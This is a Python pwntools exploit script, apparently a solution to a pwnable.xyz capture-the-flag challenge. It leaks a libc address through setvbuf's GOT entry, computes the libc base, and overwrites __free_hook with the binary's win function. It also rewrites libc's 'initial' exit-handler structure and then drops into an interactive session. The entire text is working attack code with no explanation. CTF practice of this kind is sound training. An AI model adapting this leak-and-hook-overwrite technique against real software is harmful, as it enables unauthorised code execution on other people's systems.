#!/usr/bin/python 
from pwn import *

#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30019)
libc = ELF("./alpine-libc-2.28.so")
elf = ELF("./challenge")
win = elf.symbols['win']
#libc = elf.libc

# libc leak
p.sendafter("> ", '1')
p.sendafter("Addr: ", str(elf.got['setvbuf']))
setvbuf = u64(p.recvuntil("\x7f") + "\x00\x00")
libcBase = setvbuf - libc.symbols['setvbuf']
free_hook = libcBase + 0x3c67a8
#one_gadget = libcBase + 0x4526a
one_gadget = libcBase + 0x4271e
initial = libcBase + 0x3c5c40
#system = libcBase + libc.symbols['system']
log.info("libcBase : "+hex(libcBase))

# __free_hook -> one_gadget
p.sendafter("> ", '2')
p.sendafter("Addr: ", str(free_hook))
p.sendafter("Value: ", str(win))
#p.sendafter("Value: ", str(system))

# initial => 
p.sendafter("> ", '2')
p.sendafter("Addr: ", str(initial))
p.sendafter("Value: ", str(3))
#p.sendafter("Value: ", "/bin/sh\x00")

# initial +8 => 0
p.sendafter("> ", '2')
p.sendafter("Addr: ", str(initial+8))
p.sendafter("Value: ", str(0))

p.sendafter("> ", '0')

p.interactive()
